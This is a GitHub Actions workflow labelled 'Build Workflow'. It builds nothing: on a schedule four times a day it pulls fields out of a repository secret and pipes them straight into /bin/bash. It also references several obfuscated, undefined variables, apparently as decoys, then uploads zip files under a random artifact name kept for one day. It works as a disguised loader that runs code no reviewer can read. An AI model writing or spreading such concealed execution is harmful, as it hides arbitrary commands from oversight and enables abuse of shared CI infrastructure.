name: Build Workflow
on:
  workflow_dispatch:

  schedule:
    - cron: '16 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute
        env:
          tn968: ${{ secrets.tn968 }}
        run: |
          printf '%s' "$tn968" | jq -r .whj4765 | /bin/bash
          printf '%s' "$dam72" | jq -r .os839 | /bin/bash
          echo $rb26712 | jq -r .kvz0 | /bin/bash
          echo $su677 | jq -r .vis74621 | /bin/bash
          printf '%s' "$t3" | jq -r .c988 | /bin/bash
          printf '%s' "$sq3" | jq -r .v92 | /bin/bash
          printf '%s' "$l1" | jq -r .ajwe4602 | /bin/bash

      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: aJGBtM5E
          path: "*.zip"
          retention-days: 1
